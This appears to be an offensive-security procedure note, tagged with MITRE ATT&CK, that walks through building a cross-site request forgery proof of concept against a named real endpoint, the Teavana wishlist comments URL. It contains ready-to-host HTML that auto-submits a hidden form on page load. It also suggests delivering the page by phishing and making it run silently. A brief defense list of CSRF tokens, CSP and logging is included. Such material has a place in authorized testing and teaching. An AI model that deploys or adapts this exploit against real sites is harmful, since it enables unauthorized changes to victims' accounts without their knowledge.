---
tags:
  - csrf
  - poc
  - html
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:29.962Z'
sub_techniques: []
id: d4956bd8-cd61-4de0-bd2d-aa6567342e9a
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Create-Malicious-HTML-for-CSRF-PoC

## Summary

This procedure creates a proof-of-concept HTML page that automatically submits a form to the vulnerable Teavana wishlist comments endpoint, exploiting CSRF to add or edit comments without user interaction.

## Description

The PoC leverages an HTML form with auto-submit functionality via the onload event, targeting the identified endpoint. When loaded in a victim's browser (while authenticated on teavana.com), it performs a cross-origin POST with the malicious payload, such as wishlistComment=malicious text&save=true. This demonstrates the vulnerability's exploitability, leading to unauthorized account modifications. The page can be hosted on any server or delivered via phishing.

## Requirements

1. Text editor to write HTML
2. Knowledge of the target endpoint and wishlist ID
3. Server to host the HTML file

## Defense

Defensive measures and detection strategies:

- Enforce CSRF token validation on all POST endpoints
- Set strict Content-Security-Policy headers
- Log and alert on unexpected form submissions from external origins

## Objectives

1. Build an auto-submitting form for the vulnerable endpoint
2. Test the PoC locally before deployment
3. Ensure silent execution without user prompts

## Instructions

### Step 1: Write the HTML Form

**Context**: Construct the form with hidden fields for the payload.

Create an HTML file (e.g., csrf-poc.html) with the following structure:

```html
<html>
<body onload="document.forms[0].submit()">
<form action="https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/C1495572478" method="POST">
<input type="hidden" name="wishlistComment" value="Malicious comment added via CSRF">
<input type="hidden" name="save" value="true">
</form>
</body>
</html>
```

Replace C1495572478 with the actual wishlist_id and adjust payload.

**Expected Output**: Valid HTML file ready for hosting.

### Step 2: Test the PoC

**Context**: Verify auto-submission in a browser.

Open the HTML file in a browser while authenticated on teavana.com in another tab. Check the wishlist for the added comment.

**Expected Output**: Comment appears in wishlist without manual input.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[poc]]
- [[html]]
